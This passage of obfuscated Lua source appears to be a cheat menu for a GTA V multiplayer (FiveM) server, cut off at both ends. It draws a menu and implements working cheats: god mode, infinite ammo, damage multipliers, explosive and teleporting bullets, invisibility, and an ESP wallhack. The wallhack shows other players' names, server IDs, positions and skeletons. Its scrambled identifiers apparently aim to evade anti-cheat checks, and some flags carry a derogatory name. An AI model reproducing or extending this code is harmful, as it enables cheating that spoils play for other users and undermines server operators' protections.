            jrnyLearIyzKiSIen.func.DrawSomeText('Self Options', 4, false, jrnyLearIyzKiSIen.config.MainX + 38.5, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt1, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + 60 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.sub1, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Online Options', 4, true, jrnyLearIyzKiSIen.config.MainX + 86, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt2, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + 100 + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.sub2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Vehicle Options', 4, true, jrnyLearIyzKiSIen.config.MainX + 90, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt3, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + 140 + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.sub3, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Weapon Options', 4, true, jrnyLearIyzKiSIen.config.MainX + 92, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt4, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
            jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + 180 + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.sub4, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
            jrnyLearIyzKiSIen.func.DrawSomeText('Misc Options', 4, true, jrnyLearIyzKiSIen.config.MainX + 82, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt5, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

            if jrnyLearIyzKiSIen.config.Men1T then
                jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb1 + 10, 20, 20, 90.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            else
                jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb1 + 10, 20, 20, 0.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            end

            if jrnyLearIyzKiSIen.config.Men2T then
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + 40 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb2 + 10, 20, 20, 90.0, NeekerMan1, TickyR2, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            else
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + 40 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb2 + 10, 20, 20, 0.0, NeekerMan1, TickyR2, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            end

            if jrnyLearIyzKiSIen.config.Men3T then
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb3 + 10, 20, 20, 90.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            else
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb3 + 10, 20, 20, 0.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            end

            if jrnyLearIyzKiSIen.config.Men4T then
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + 140 + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb4 + 10, 20, 20, 90.0, NeekerMan1, TickyR2, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            else
               jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + 140 + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb4 + 10, 20, 20, 0.0, NeekerMan1, TickyR2, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            end

            if jrnyLearIyzKiSIen.config.Men5T then
                jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb5 + 10, 20, 20, 90.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            else
                jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + 20, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb5 + 10, 20, 20, 0.0, NeekerMan, TickyR1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, true)
            end

            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY, 300, 15) and nlFXKkFxuKQAk.natives.IsDisabledControlJustPressed(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                local newx, newy = nlFXKkFxuKQAk.natives.GetNuiCursorPosition()
                local nnewx = jrnyLearIyzKiSIen.config.MainX - newx
                local nnewy = jrnyLearIyzKiSIen.config.MainY - newy
                jrnyLearIyzKiSIen.config.Drag.x = nnewx
                jrnyLearIyzKiSIen.config.Drag.y = nnewy
                jrnyLearIyzKiSIen.config.Drag.draggienow = true
            elseif nlFXKkFxuKQAk.natives.IsDisabledControlReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                jrnyLearIyzKiSIen.config.Drag.draggienow = false
            end

            if jrnyLearIyzKiSIen.config.Drag.draggienow then
                local newx, newy = nlFXKkFxuKQAk.natives.GetNuiCursorPosition()
                nlFXKkFxuKQAk.natives.SetMouseCursorSprite(4)
                jrnyLearIyzKiSIen.config.MainX = newx + jrnyLearIyzKiSIen.config.Drag.x
                jrnyLearIyzKiSIen.config.MainY = newy + jrnyLearIyzKiSIen.config.Drag.y
            else
                nlFXKkFxuKQAk.natives.SetMouseCursorSprite(1)
            end

            --jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb1, 20, 20, 255, 255, 255, 255)
            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men1Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb1, 20, 20) and nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                jrnyLearIyzKiSIen.config.Men1T = not jrnyLearIyzKiSIen.config.Men1T
            end

            --jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + 40 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb2, 20, 20, 255, 255, 255, 255)
            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + 40 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb2, 20, 20) and nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                jrnyLearIyzKiSIen.config.Men2T = not jrnyLearIyzKiSIen.config.Men2T
            end
            
           --jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb3, 20, 20, 255, 255, 255, 255)
            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb3, 20, 20) and nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                jrnyLearIyzKiSIen.config.Men3T = not jrnyLearIyzKiSIen.config.Men3T
            end

            --jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + 140 + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb4, 20, 20, 255, 255, 255, 255)
            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + 140 + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb4, 20, 20) and nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                jrnyLearIyzKiSIen.config.Men4T = not jrnyLearIyzKiSIen.config.Men4T
            end

            --jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb5, 20, 20, 255, 255, 255, 255)
            if jrnyLearIyzKiSIen.func.HoverOn(jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.SubMenuWH.subb5, 20, 20) and nlFXKkFxuKQAk.natives.IsDisabledControlJustReleased(0, RfPsUKHSFWJuBEJuz.Keys['MOUSE1']) then
                nlFXKkFxuKQAk.natives.PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", 1)
                jrnyLearIyzKiSIen.config.Men5T = not jrnyLearIyzKiSIen.config.Men5T
            end

        end

        
        --Feature Section (Normal Natives)
        nlFXKkFxuKQAk.natives.SetPlayerInvincible(nlFXKkFxuKQAk.natives.PlayerPedId(), jrnyLearIyzKiSIen.config.features.SupaJesusMode)
        nlFXKkFxuKQAk.natives.SetEntityInvincible(nlFXKkFxuKQAk.natives.PlayerPedId(), jrnyLearIyzKiSIen.config.features.SupaJesusMode)
        nlFXKkFxuKQAk.natives.SetWeaponDamageModifier(nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.PlayerPedId()), REVMYmrswsZvxOXvJE.DmgMultiTasker.values[REVMYmrswsZvxOXvJE.DmgMultiTasker.selectedItemIndex])
        nlFXKkFxuKQAk.natives.SetPlayerMeleeWeaponDamageModifier(nlFXKkFxuKQAk.natives.PlayerPedId(), REVMYmrswsZvxOXvJE.DmgMultiTasker.values[REVMYmrswsZvxOXvJE.DmgMultiTasker.selectedItemIndex])
        nlFXKkFxuKQAk.natives.SetPedInfiniteAmmoClip(nlFXKkFxuKQAk.natives.PlayerPedId(), jrnyLearIyzKiSIen.config.features.GunNevaStop)
        nlFXKkFxuKQAk.natives.SetPedCanRagdoll(nlFXKkFxuKQAk.natives.PlayerPedId(), not jrnyLearIyzKiSIen.config.features.noragmen)
        nlFXKkFxuKQAk.natives.SetPedSuffersCriticalHits(nlFXKkFxuKQAk.natives.PlayerPedId(), not jrnyLearIyzKiSIen.config.features.nocritsmen)
        nlFXKkFxuKQAk.natives.SetVehicleCheatPowerIncrease(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), REVMYmrswsZvxOXvJE.Bopt.values[REVMYmrswsZvxOXvJE.Bopt.selectedItemIndex])

        -- Features Section2 (if then Features)
        if jrnyLearIyzKiSIen.config.features.RBM then
            local ra = jrnyLearIyzKiSIen.func.RGBRainbow(1.5)
            jrnyLearIyzKiSIen.config.CText.r = ra.r
            jrnyLearIyzKiSIen.config.CText.g = ra.g
            jrnyLearIyzKiSIen.config.CText.b = ra.b
            jrnyLearIyzKiSIen.config.CText.a = 255
        end
        
        if jrnyLearIyzKiSIen.config.features.gayesp then
			local plist = nlFXKkFxuKQAk.natives.GetActivePlayers()
			jrnyLearIyzKiSIen.func.table_removekey(plist, nlFXKkFxuKQAk.natives.PlayerId())
			for i = 1, #plist do
                local targetCoords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 31086, 0.0, 0.0, 0.0)
				local distance = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId()), targetCoords)
				if distance <= jrnyLearIyzKiSIen.config.ESPDist then
                    local vehname = 'On Foot'
                    if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 0) then
                        vehname = nlFXKkFxuKQAk.natives.GetLabelText(nlFXKkFxuKQAk.natives.GetDisplayNameFromVehicleModel(nlFXKkFxuKQAk.natives.GetEntityModel(nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])))))
                    end		
                    local espstring1 = ''
                        if jrnyLearIyzKiSIen.config.features.gayespid then
                            if nlFXKkFxuKQAk.natives.IsEntityDead(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])) then
                                espstring1 = espstring1..'~r~ [ ' .. nlFXKkFxuKQAk.natives.GetPlayerServerId(plist[i]) .. ' ]'
                            else
                                espstring1 = espstring1..' ~b~[ ~w~' .. nlFXKkFxuKQAk.natives.GetPlayerServerId(plist[i]) .. ' ~b~]~w~'
                            end
                        end
                        if jrnyLearIyzKiSIen.config.features.gayespname then
                            if nlFXKkFxuKQAk.natives.IsEntityDead(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])) then
                                espstring1 = espstring1..' ' .. nlFXKkFxuKQAk.natives.GetPlayerName(plist[i])..' '
                            else
                                espstring1 = espstring1..' ' .. nlFXKkFxuKQAk.natives.GetPlayerName(plist[i])..' '
                            end
                        end
                        if jrnyLearIyzKiSIen.config.features.gayespdistance then
                            if nlFXKkFxuKQAk.natives.IsEntityDead(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])) then
                                espstring1 = espstring1..'[Distance] ' .. RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(distance)
                            else
                                espstring1 = espstring1..'~b~[~w~Distance~b~] ~w~' .. RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(distance)
                            end
                        end
                        if jrnyLearIyzKiSIen.config.features.gayespvehicle then
                            if nlFXKkFxuKQAk.natives.IsEntityDead(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i])) then
                                espstring1 = espstring1..' [Vehicle] ' .. vehname..''
                            else
                                espstring1 = espstring1..' ~b~[~w~Vehicle~b~] ~w~' .. vehname..''
                            end 
                        end
                    jrnyLearIyzKiSIen.func.DrawESPText(targetCoords.x, targetCoords.y, targetCoords.z + 1.2, espstring1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    if jrnyLearIyzKiSIen.config.features.gayespbones then
                        
                        nlFXKkFxuKQAk.natives.ResetEntityAlpha(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]))
                        nlFXKkFxuKQAk.natives.SetEntityAlpha(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 100, false)

                        local coreC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 0, 0.0, 0.0, 0.0)
                        local neckC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 35731, 0.0, 0.0, 0.0)
                        local RshoulderC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 40269, 0.0, 0.0, 0.0)
                        local LshoulderC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 45509, 0.0, 0.0, 0.0)
                        local RelboC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 2992, 0.0, 0.0, 0.0)
                        local LelboC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 22711, 0.0, 0.0, 0.0)
                        local RhandC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 57005, 0.0, 0.0, 0.0)
                        local LhandC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 18905, 0.0, 0.0, 0.0)
                        local RthighC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 51826, 0.0, 0.0, 0.0)
                        local LthighC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 58271, 0.0, 0.0, 0.0)
                        local RkneeC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 16335, 0.0, 0.0, 0.0)
                        local LkneeC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 46078, 0.0, 0.0, 0.0)
                        local RfootC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 52301, 0.0, 0.0, 0.0)
                        local LfootC = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]), 14201, 0.0, 0.0, 0.0)
                        
                        nlFXKkFxuKQAk.natives.DrawLine(neckC.x, neckC.y, neckC.z, coreC.x, coreC.y, coreC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(neckC.x, neckC.y, neckC.z, RshoulderC.x, RshoulderC.y, RshoulderC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(neckC.x, neckC.y, neckC.z, LshoulderC.x, LshoulderC.y, LshoulderC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(RelboC.x, RelboC.y, RelboC.z, RshoulderC.x, RshoulderC.y, RshoulderC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(LelboC.x, LelboC.y, LelboC.z, LshoulderC.x, LshoulderC.y, LshoulderC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(RelboC.x, RelboC.y, RelboC.z, RhandC.x, RhandC.y, RhandC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(LelboC.x, LelboC.y, LelboC.z, LhandC.x, LhandC.y, LhandC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(RthighC.x, RthighC.y, RthighC.z, coreC.x, coreC.y, coreC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(LthighC.x, LthighC.y, LthighC.z, coreC.x, coreC.y, coreC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(RthighC.x, RthighC.y, RthighC.z, RkneeC.x, RkneeC.y, RkneeC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(LthighC.x, LthighC.y, LthighC.z, LkneeC.x, LkneeC.y, LkneeC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(RfootC.x, RfootC.y, RfootC.z, RkneeC.x, RkneeC.y, RkneeC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                        nlFXKkFxuKQAk.natives.DrawLine(LfootC.x, LfootC.y, LfootC.z, LkneeC.x, LkneeC.y, LkneeC.z, jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                    else
                        nlFXKkFxuKQAk.natives.ResetEntityAlpha(nlFXKkFxuKQAk.natives.GetPlayerPed(plist[i]))
                    end
                end
			end
		end

        if jrnyLearIyzKiSIen.config.features.Gungokaboom then 
            local jsnow, bigcord = nlFXKkFxuKQAk.natives.GetPedLastWeaponImpactCoord(nlFXKkFxuKQAk.natives.PlayerPedId()) 
            if jsnow then 
                nlFXKkFxuKQAk.natives.AddExplosion(bigcord.x, bigcord.y, bigcord.z, 2, 100000.0, true, false, 0)
            end 
        end

        if jrnyLearIyzKiSIen.config.features.GunGoMoverino then
            local jsnow, bigcord = nlFXKkFxuKQAk.natives.GetPedLastWeaponImpactCoord(nlFXKkFxuKQAk.natives.PlayerPedId())
            if jsnow then 
                nlFXKkFxuKQAk.natives.SetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), bigcord.x, bigcord.y, bigcord.z, false, false, false, false)
            end
        end

        if jrnyLearIyzKiSIen.config.features.SupaNoSee then 
            nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), false, false)  
        else 
            nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.PlayerPedId(), true, false)
        end

        if jrnyLearIyzKiSIen.config.features.vehicularnosee then
            nlFXKkFxuKQAk.natives.SetEntityVisible(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), false, false)
        else
